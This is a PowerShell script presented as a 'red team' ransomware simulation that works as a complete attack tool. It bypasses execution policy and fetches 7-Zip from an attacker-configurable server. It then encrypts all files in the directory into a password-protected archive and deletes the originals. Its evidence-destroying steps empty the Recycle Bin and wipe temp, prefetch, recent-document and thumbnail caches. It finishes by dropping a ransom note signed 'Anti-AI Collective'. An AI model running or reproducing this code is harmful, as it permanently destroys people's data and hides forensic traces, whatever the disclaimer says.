################################################################################
# File Encryption Simulation Script (PowerShell)
# For AUTHORIZED Red Team Operations Only
# WARNING: This will encrypt and delete files - use only in test environments
################################################################################

#Requires -Version 3.0

<#
.SYNOPSIS
    Simulates ransomware encryption behavior for red team testing.

.DESCRIPTION
    Downloads 7-Zip, creates encrypted archive, and deletes original files.
    FOR AUTHORIZED PENETRATION TESTING ONLY.

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing
    Warning: Will delete files permanently
#>

# Attempt to enable script execution (may require admin)
try {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Script execution policy bypassed for this process" -ForegroundColor Green
} catch {
    Write-Host "[!] Could not bypass execution policy - may require admin privileges" -ForegroundColor Yellow
}

# Configuration
$RemoteServer = "http://YOUR_SERVER_IP_HERE"
$SevenZipUrl = "$RemoteServer/7z.exe"
$SevenZipInstallerUrl = "$RemoteServer/7z-installer.exe"
$ArchiveName = "encrypted_files.7z"
$InstallDir = "$env:ProgramFiles\7-Zip"
$TempDir = "$env:TEMP\7z_temp"
$CurrentDir = Get-Location
$ScriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
if ([string]::IsNullOrEmpty($ScriptDirectory)) {
    $ScriptDirectory = $PWD.Path
}

################################################################################
# Password Configuration - Multiple Methods (Priority Order)
################################################################################

$Password = $null
$PasswordMethod = "Unknown"

# Method 1: Check for environment variable (highest priority - passed externally)
# Usage: $env:ENCRYPT_KEY="yourpassword"; .\encrypt_files.ps1
if ($env:ENCRYPT_KEY) {
    $Password = $env:ENCRYPT_KEY
    $PasswordMethod = "Environment Variable"
}
# Method 2: Decode from Base64-encoded string (obfuscated storage)
# This is "antai" encoded in Base64: YW50YWk=
# To encode your own in PowerShell: [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("yourpassword"))
elseif (-not $Password) {
    try {
        $EncodedPassword = "YW50YWk="
        $Password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedPassword))
        $PasswordMethod = "Base64 Decoded"
    } catch {
        $Password = $null
    }
}
# Method 3: Generate random password (use if above methods fail)
if (-not $Password) {
    try {
        # Generate 16-character random password with mixed case, numbers, and symbols
        $Password = -join ((65..90) + (97..122) + (48..57) + @(33,35,36,37,38,42,43,45,61) | Get-Random -Count 16 | ForEach-Object {[char]$_})
        $PasswordMethod = "Random Generated"
    } catch {
        # Final fallback
        $Password = "Fallback_P@ssw0rd_$(Get-Random -Minimum 10000 -Maximum 99999)"
        $PasswordMethod = "Fallback Random"
    }
}

# Ensure we have a password
if ([string]::IsNullOrEmpty($Password)) {
    $Password = "Emergency_$(Get-Date -Format 'yyyyMMddHHmmss')_$(Get-Random)"
    $PasswordMethod = "Emergency Fallback"
}

# Banner
Write-Host ""
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "File Encryption Simulation - Red Team Operation" -ForegroundColor Cyan
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[WARNING] This script will encrypt and delete files in current directory" -ForegroundColor Red
Write-Host "[WARNING] For authorized testing only - ensure proper authorization" -ForegroundColor Red
Write-Host ""
Write-Host "Current Directory: $CurrentDir" -ForegroundColor Yellow
Write-Host "Archive Name: $ArchiveName" -ForegroundColor Yellow
Write-Host "Password Method: $PasswordMethod" -ForegroundColor Yellow
Write-Host ""
Write-Host "Starting in 5 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""

################################################################################
# Functions
################################################################################

function Write-Status {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )

    switch ($Type) {
        "Success" { Write-Host "[+] $Message" -ForegroundColor Green }
        "Error"   { Write-Host "[-] $Message" -ForegroundColor Red }
        "Warning" { Write-Host "[!] $Message" -ForegroundColor Yellow }
        "Info"    { Write-Host "[*] $Message" -ForegroundColor Cyan }
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )

    try {
        # Method 1: WebClient (faster)
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)
        return $true
    } catch {
        try {
            # Method 2: Invoke-WebRequest (fallback)
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
            return $true
        } catch {
            try {
                # Method 3: BitsTransfer (fallback)
                Import-Module BitsTransfer -ErrorAction SilentlyContinue
                Start-BitsTransfer -Source $Url -Destination $OutputPath
                return $true
            } catch {
                return $false
            }
        }
    }
}

function Find-SevenZip {
    param(
        [string]$ScriptDirectory
    )

    # Priority order for finding 7z.exe:
    # 1. Same directory as script (local copy)
    # 2. Standard installation paths
    # 3. Downloaded temp location
    # 4. System PATH

    $possiblePaths = @(
        # Priority 1: Script directory (allows bundling 7z.exe with script)
        (Join-Path $ScriptDirectory "7z.exe"),

        # Priority 2: Standard installations
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
        "$env:LOCALAPPDATA\7-Zip\7z.exe",

        # Priority 3: Downloaded to temp
        "$TempDir\7z.exe"
    )

    foreach ($path in $possiblePaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            # Verify it's actually executable
            try {
                $testProcess = Start-Process -FilePath $path -ArgumentList "--help" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_test_err.txt"
                if ($testProcess.ExitCode -le 1) {  # 7z returns 0 or 1 for help
                    Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$env:TEMP\7z_test_err.txt" -Force -ErrorAction SilentlyContinue
                    return $path
                }
            } catch {
                # Not executable, continue searching
                continue
            }
        }
    }

    # Priority 4: Try to find in system PATH
    try {
        $sevenZip = Get-Command "7z.exe" -ErrorAction SilentlyContinue
        if ($sevenZip) {
            return $sevenZip.Source
        }
    } catch {
        # Not in PATH
    }

    return $null
}

function Download-Official7Zip {
    param(
        [string]$InstallDirectory
    )

    try {
        Write-Status "Attempting to download official 7-Zip from 7-zip.org..." -Type Info

        # Force TLS 1.2 for compatibility
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

        $officialUrl = "https://www.7-zip.org/a/7z2501-x64.exe"
        $downloadPath = Join-Path $env:TEMP "7z-official-installer.exe"

        # Download the official installer
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($officialUrl, $downloadPath)

        if (Test-Path $downloadPath) {
            Write-Status "Downloaded official 7-Zip installer" -Type Success
            Write-Status "Installing silently..." -Type Info

            # Run silent installation
            $installProcess = Start-Process -FilePath $downloadPath -ArgumentList "/S", "/D=$InstallDirectory" -Wait -PassThru -NoNewWindow
            Start-Sleep -Seconds 10

            # Check if installation succeeded
            $expectedPath = Join-Path $InstallDirectory "7z.exe"
            if (Test-Path $expectedPath) {
                Write-Status "Successfully installed 7-Zip from official source" -Type Success

                # Cleanup installer
                Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue

                return $expectedPath
            } else {
                Write-Status "Installation completed but 7z.exe not found at expected location" -Type Warning
            }

            # Cleanup on failure
            Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Status "Failed to download/install from 7-zip.org: $($_.Exception.Message)" -Type Warning
    }

    return $null
}

################################################################################
# Main Execution
################################################################################

try {
    # Step 1: Locate or obtain 7-Zip executable
    Write-Status "Step 1/5: Locating 7-Zip executable..." -Type Info

    # Create temp directory if needed
    if (-not (Test-Path $TempDir)) {
        try {
            New-Item -ItemType Directory -Path $TempDir -Force -ErrorAction Stop | Out-Null
        } catch {
            Write-Status "Could not create temp directory, using script directory" -Type Warning
            $TempDir = $ScriptDirectory
        }
    }

    # Try to find existing 7z.exe (includes script directory as priority)
    $sevenZipExe = Find-SevenZip -ScriptDirectory $ScriptDirectory

    if ($null -eq $sevenZipExe) {
        Write-Status "No existing 7-Zip installation found" -Type Warning
        Write-Status "Attempting to download 7z.exe..." -Type Info

        $downloadPath = "$TempDir\7z.exe"

        if (Download-File -Url $SevenZipUrl -OutputPath $downloadPath) {
            if (Test-Path $downloadPath) {
                Write-Status "Successfully downloaded 7-Zip executable" -Type Success
                $sevenZipExe = $downloadPath
            } else {
                Write-Status "Download completed but file not found" -Type Error
            }
        } else {
            Write-Status "Failed to download 7-Zip executable" -Type Error

            # Try to install from installer
            Write-Status "Step 2/5: Attempting to install 7-Zip from installer..." -Type Info
            $installerPath = "$TempDir\7z-installer.exe"

            if (Download-File -Url $SevenZipInstallerUrl -OutputPath $installerPath) {
                Write-Status "Installer downloaded, installing silently..." -Type Info

                try {
                    # Silent install
                    $installProcess = Start-Process -FilePath $installerPath -ArgumentList "/S", "/D=$InstallDir" -Wait -PassThru -NoNewWindow -ErrorAction Stop
                    Start-Sleep -Seconds 5

                    $sevenZipExe = Find-SevenZip -ScriptDirectory $ScriptDirectory

                    if ($null -ne $sevenZipExe) {
                        Write-Status "7-Zip installed successfully" -Type Success
                    } else {
                        throw "Installation completed but 7z.exe not found"
                    }
                } catch {
                    throw "Failed to install 7-Zip: $($_.Exception.Message)"
                }
            } else {
                throw "Could not obtain 7-Zip through any method"
            }
        }
    } else {
        Write-Status "Found 7-Zip at: $sevenZipExe" -Type Success
    }

    # Final verification - if still no 7z.exe, try official download as last resort
    if ($null -eq $sevenZipExe -or -not (Test-Path $sevenZipExe)) {
        Write-Status "All standard methods failed, attempting official 7-Zip download..." -Type Warning

        $sevenZipExe = Download-Official7Zip -InstallDirectory $InstallDir

        if ($null -eq $sevenZipExe -or -not (Test-Path $sevenZipExe)) {
            throw @"
CRITICAL ERROR: Could not locate or obtain 7-Zip

Attempted methods:
  1. Local 7z.exe in script directory ($ScriptDirectory)
  2. System installation (Program Files)
  3. Download from configured server ($RemoteServer)
  4. Installer from configured server
  5. System PATH
  6. Official download from 7-zip.org

Please manually:
  - Place 7z.exe in the same folder as this script, OR
  - Install 7-Zip on the system

Operation aborted.
"@
        }
    }

    Write-Status "Using 7-Zip executable: $sevenZipExe" -Type Success

    # Step 3: Create encrypted archive
    Write-Host ""
    Write-Status "Step 3/5: Creating encrypted 7z archive..." -Type Info
    Write-Status "Password: $Password" -Type Info
    Write-Status "This may take a while depending on file size..." -Type Info
    Write-Host ""

    $archivePath = Join-Path $CurrentDir $ArchiveName

    # Build 7-Zip arguments - exclude scripts and existing archives
    $arguments = @(
        "a",                    # Add to archive
        "-t7z",                 # Archive type
        "-m0=lzma2",           # Compression method
        "-mx=9",               # Maximum compression
        "-mfb=64",             # Fast bytes
        "-md=32m",             # Dictionary size
        "-ms=on",              # Solid archive
        "-mhe=on",             # Encrypt headers
        "-p$Password",         # Password
        "`"$archivePath`"",    # Archive path
        "`"$CurrentDir\*`"",   # Files to archive
        "-r",                  # Recursive
        "-x!$ArchiveName",     # Exclude the archive itself
        "-xr!*.7z",            # Exclude other 7z files
        "-xr!*.ps1",           # Exclude PowerShell scripts
        "-xr!*.bat"            # Exclude batch scripts
    )

    try {
        $process = Start-Process -FilePath $sevenZipExe -ArgumentList $arguments -Wait -PassThru -NoNewWindow -ErrorAction Stop

        if ($process.ExitCode -ne 0) {
            throw "7-Zip process exited with code: $($process.ExitCode)"
        }

        # Verify the file was actually created
        if (-not (Test-Path $archivePath)) {
            throw "Archive file was not created at expected location"
        }

        # Check that archive has content
        $archiveInfo = Get-Item $archivePath
        if ($archiveInfo.Length -eq 0) {
            throw "Archive file is 0 bytes (empty)"
        }

        Write-Status "Archive created successfully: $ArchiveName" -Type Success
        Write-Status "Archive size: $([math]::Round($archiveInfo.Length / 1MB, 2)) MB" -Type Info

    } catch {
        throw @"
Failed to create archive: $($_.Exception.Message)

Possible causes:
  - Insufficient disk space
  - Permission denied
  - 7-Zip executable error
  - Path: $sevenZipExe

Operation aborted - no files will be deleted.
"@
    }

    # Step 4: Verify archive
    Write-Host ""
    Write-Status "Step 4/5: Verifying archive integrity..." -Type Info

    if (-not (Test-Path $archivePath)) {
        throw "CRITICAL: Archive file not found at: $archivePath"
    }

    # Double-check archive size
    $archiveSize = (Get-Item $archivePath).Length
    if ($archiveSize -eq 0) {
        throw "CRITICAL: Archive file is 0 bytes!"
    }

    Write-Status "Testing archive integrity with password..." -Type Info

    try {
        $verifyLogPath = Join-Path $TempDir "verify_output.log"
        $verifyErrPath = Join-Path $TempDir "verify_error.log"

        $verifyArgs = @("t", "-p$Password", "`"$archivePath`"")
        $verifyProcess = Start-Process -FilePath $sevenZipExe -ArgumentList $verifyArgs -Wait -PassThru -NoNewWindow -RedirectStandardOutput $verifyLogPath -RedirectStandardError $verifyErrPath -ErrorAction Stop

        if ($verifyProcess.ExitCode -ne 0) {
            # Read error details if available
            $errorDetails = ""
            if (Test-Path $verifyErrPath) {
                $errorDetails = Get-Content $verifyErrPath -Raw
            }

            throw @"
Archive verification failed!
Exit Code: $($verifyProcess.ExitCode)
Error Details: $errorDetails

The archive may be corrupted or password incorrect.
Aborting deletion phase for safety.
"@
        }

        # Clean up verification logs
        Remove-Item $verifyLogPath -Force -ErrorAction SilentlyContinue
        Remove-Item $verifyErrPath -Force -ErrorAction SilentlyContinue

        Write-Status "Archive verified successfully - integrity confirmed" -Type Success

    } catch {
        throw "Archive verification error: $($_.Exception.Message)"
    }

    # Step 5: Delete original files
    Write-Host ""
    Write-Status "Step 5/5: Deleting original files..." -Type Info
    Write-Status "WARNING: This will permanently delete files!" -Type Warning
    Write-Status "Press Ctrl+C to abort in the next 5 seconds..." -Type Warning
    Start-Sleep -Seconds 5
    Write-Host ""

    # Get current script name to avoid deleting ourselves
    $currentScriptName = Split-Path -Leaf $MyInvocation.MyCommand.Path

    # Get all files except critical ones
    Write-Status "Scanning for files to delete..." -Type Info

    $filesToDelete = @()
    $skippedFiles = @()

    try {
        $allFiles = Get-ChildItem -Path $CurrentDir -Recurse -File -ErrorAction SilentlyContinue

        foreach ($file in $allFiles) {
            $shouldSkip = $false

            # Skip the archive
            if ($file.FullName -eq $archivePath) {
                $shouldSkip = $true
            }
            # Skip 7z files
            elseif ($file.Extension -eq '.7z') {
                $shouldSkip = $true
            }
            # Skip script files
            elseif ($file.Extension -eq '.ps1' -or $file.Extension -eq '.bat') {
                $shouldSkip = $true
            }
            # Skip ransom note
            elseif ($file.Name -eq 'README_IMPORTANT.txt') {
                $shouldSkip = $true
            }
            # Skip 7z.exe if present
            elseif ($file.Name -eq '7z.exe') {
                $shouldSkip = $true
            }

            if ($shouldSkip) {
                $skippedFiles += $file
            } else {
                $filesToDelete += $file
            }
        }

        Write-Status "Found $($filesToDelete.Count) files to delete" -Type Info
        Write-Status "Skipping $($skippedFiles.Count) files (archive, scripts, tools)" -Type Info
        Write-Host ""

        $deletedCount = 0
        $failedCount = 0

        foreach ($file in $filesToDelete) {
            try {
                Write-Status "Deleting: $($file.FullName)" -Type Info
                Remove-Item -Path $file.FullName -Force -ErrorAction Stop

                # Verify deletion
                if (-not (Test-Path $file.FullName)) {
                    $deletedCount++
                } else {
                    $failedCount++
                    Write-Status "Warning: File still exists after delete attempt" -Type Warning
                }
            } catch {
                $failedCount++
                Write-Status "Failed to delete: $($file.FullName) - $($_.Exception.Message)" -Type Warning
            }
        }

        Write-Host ""
        Write-Status "Deletion Summary:" -Type Info
        Write-Status "  Files processed: $($filesToDelete.Count)" -Type Info
        Write-Status "  Successfully deleted: $deletedCount" -Type $(if ($deletedCount -eq $filesToDelete.Count) { "Success" } else { "Info" })

        if ($failedCount -gt 0) {
            Write-Status "  Failed to delete: $failedCount" -Type Warning
        } else {
            Write-Status "  Failed to delete: 0" -Type Info
        }

        # Delete empty directories (non-critical operation)
        Write-Host ""
        Write-Status "Removing empty directories..." -Type Info
        try {
            $emptyDirs = Get-ChildItem -Path $CurrentDir -Recurse -Directory -ErrorAction SilentlyContinue |
                Where-Object { (Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 } |
                Sort-Object -Property FullName -Descending

            foreach ($dir in $emptyDirs) {
                try {
                    Remove-Item -Path $dir.FullName -Force -ErrorAction SilentlyContinue
                } catch {
                    # Silently ignore directory deletion errors
                }
            }
        } catch {
            # Non-critical - continue
        }

        Write-Status "File deletion process completed" -Type Success

    } catch {
        Write-Status "Error during file deletion: $($_.Exception.Message)" -Type Error
        Write-Status "Some files may not have been deleted" -Type Warning
    }

    # Cleanup temp directory
    if (Test-Path $TempDir) {
        Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Step 6: System cleanup and recycle bin emptying
    Write-Host ""
    Write-Status "Step 6/6: Running system cleanup..." -Type Info
    Write-Status "Starting background cleanup processes..." -Type Info

    # Empty Recycle Bin
    try {
        Write-Status "Emptying Recycle Bin..." -Type Info

        # Method 1: Using Shell.Application COM object
        try {
            $shell = New-Object -ComObject Shell.Application
            $recycleBin = $shell.Namespace(0xA)
            $recycleBin.Items() | ForEach-Object {
                Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue
            }
            Write-Status "Recycle Bin emptied successfully" -Type Success
        } catch {
            # Method 2: Direct file system approach
            Write-Status "Using alternate method to empty Recycle Bin..." -Type Info
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' }
            foreach ($drive in $drives) {
                $recycleBinPath = Join-Path $drive.Root '$Recycle.Bin'
                if (Test-Path $recycleBinPath) {
                    Get-ChildItem -Path $recycleBinPath -Force -Recurse -ErrorAction SilentlyContinue |
                        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
            Write-Status "Recycle Bin cleanup completed" -Type Success
        }
    } catch {
        Write-Status "Could not empty Recycle Bin: $($_.Exception.Message)" -Type Warning
    }

    # Clear Windows temp files in background
    Write-Status "Starting temp file cleanup in background..." -Type Info
    $cleanupJob = Start-Job -ScriptBlock {
        try {
            # Clear user temp
            Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

            # Clear system temp
            Get-ChildItem -Path "$env:SystemRoot\Temp" -Recurse -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            # Silently continue
        }
    }

    # Clear prefetch files
    try {
        Write-Status "Clearing prefetch files..." -Type Info
        $prefetchPath = Join-Path $env:SystemRoot "Prefetch"
        if (Test-Path $prefetchPath) {
            Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Status "Prefetch files cleared" -Type Success
        }
    } catch {
        Write-Status "Could not clear prefetch files (may require admin privileges)" -Type Warning
    }

    # Clear recent documents
    try {
        Write-Status "Clearing recent documents..." -Type Info
        $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
        if (Test-Path $recentPath) {
            Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            Write-Status "Recent documents cleared" -Type Success
        }
    } catch {
        Write-Status "Could not clear recent documents" -Type Warning
    }

    # Clear thumbnail cache
    try {
        Write-Status "Clearing thumbnail cache..." -Type Info
        $thumbCachePath = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\Explorer"
        if (Test-Path $thumbCachePath) {
            Get-ChildItem -Path $thumbCachePath -Filter "thumbcache_*.db" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Status "Thumbnail cache cleared" -Type Success
        }
    } catch {
        # Non-critical
    }

    # Run Disk Cleanup utility in background (if available)
    try {
        if (Get-Command cleanmgr.exe -ErrorAction SilentlyContinue) {
            Write-Status "Starting Windows Disk Cleanup in background..." -Type Info
            Start-Process cleanmgr.exe -ArgumentList "/sagerun:1" -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {
        # Non-critical
    }

    Write-Status "System cleanup processes initiated" -Type Success

    # Final summary
    Write-Host ""
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "Operation Complete" -ForegroundColor Cyan
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "[+] Encrypted archive: $archivePath" -ForegroundColor Green
    Write-Host "[+] Password: $Password" -ForegroundColor Green
    Write-Host "[+] Original files have been deleted" -ForegroundColor Green
    Write-Host "[+] System cleanup processes started" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] To extract files, use:" -ForegroundColor Cyan
    Write-Host "    7z x $ArchiveName -p$Password" -ForegroundColor Yellow
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host ""

    # Create ransom note
    $ransomNote = @"
============================================================================
YOUR FILES HAVE BEEN ENCRYPTED
============================================================================

All your files have been encrypted with military-grade encryption.

[This is a SIMULATED attack for authorized red team testing]

Archive: $ArchiveName
Password: $Password

To decrypt your files, use the password provided above.

============================================================================
Anti-AI Collective - Humans First, Machines Never
============================================================================
"@

    $ransomNote | Out-File -FilePath (Join-Path $CurrentDir "README_IMPORTANT.txt") -Encoding ASCII
    Write-Status "Ransom note created: README_IMPORTANT.txt" -Type Success

} catch {
    Write-Host ""
    Write-Status "ERROR: $($_.Exception.Message)" -Type Error
    Write-Status "Operation aborted" -Type Error
    exit 1
}

Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
